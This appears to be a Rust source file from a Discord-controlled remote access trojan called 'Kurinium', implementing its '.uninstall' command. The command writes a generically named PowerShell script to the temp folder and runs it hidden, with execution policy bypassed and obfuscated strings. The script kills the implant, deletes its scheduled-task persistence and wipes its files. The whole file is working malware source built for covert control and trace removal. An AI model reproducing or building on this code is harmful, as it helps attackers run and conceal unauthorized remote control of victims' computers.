use crate::commands::*;
use crate::config::Config;
use crate::core::exit_patcher::safe_exit;
use anyhow::{Context, Result};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;

pub struct UninstallCommand;

#[async_trait]
impl BotCommand for UninstallCommand {
    fn name(&self) -> &str { "uninstall" }
    fn description(&self) -> &str { "Removes the Kurinium from the system" }
    fn category(&self) -> &str { "core" }
    fn usage(&self) -> &str { ".uninstall" }
    fn examples(&self) -> &'static [&'static str] { &[] }
    fn aliases(&self) -> &'static [&'static str] { &["rmrat", "uni"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        http.create_message(msg.channel_id)
            .content("**Removed Kurinium successfully.**")
            .await?;

        self.sched_uninstall()?;

        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
        safe_exit(0);
    }
}

impl UninstallCommand {
    fn gen_ps_script(&self) -> Result<String> {
        let curr_exe = env::current_exe().context("Failed to get current executable path")?;
        let curr_exe_path = curr_exe.to_string_lossy().to_string();
        let task_name = Config::get_startup_config().task_name;
        let install_dir = curr_exe.parent().context("Failed to get parent directory")?;
        let install_dir_path = install_dir.to_string_lossy().to_string();

        // script to kill proc, del task, del file, del dir
        let script = format!(
            r#"
Start-Sleep -Seconds 3
Stop-Process -Name "kurinium_c2" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "kurinium-c2" -Force -ErrorAction SilentlyContinue
schtasks /delete /tn "{task_name}" /f
Remove-Item -Path "{exe_path}" -Force
Start-Sleep -Seconds 1
Remove-Item -Path "{dir_path}" -Recurse -Force -ErrorAction SilentlyContinue
"#,
            task_name = task_name,
            exe_path = curr_exe_path,
            dir_path = install_dir_path
        );

        Ok(script)
    }

    fn sched_uninstall(&self) -> Result<()> {
        use crate::utils::obfuscate::{exe, powershell};
        
        let script_content = self.gen_ps_script()?;
        let tmp_dir = env::temp_dir();
        let script_path = tmp_dir.join("u.ps1"); // Generic filename

        fs::write(&script_path, script_content).context("Failed to write script")?;

        Command::new(exe::powershell())
            .args([
                &powershell::execution_policy(),
                &powershell::bypass(),
                &powershell::window_style(),
                &powershell::hidden(),
                "-File",
                &script_path.to_string_lossy(),
            ])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .context("Failed to spawn script")?;

        Ok(())
    }
}
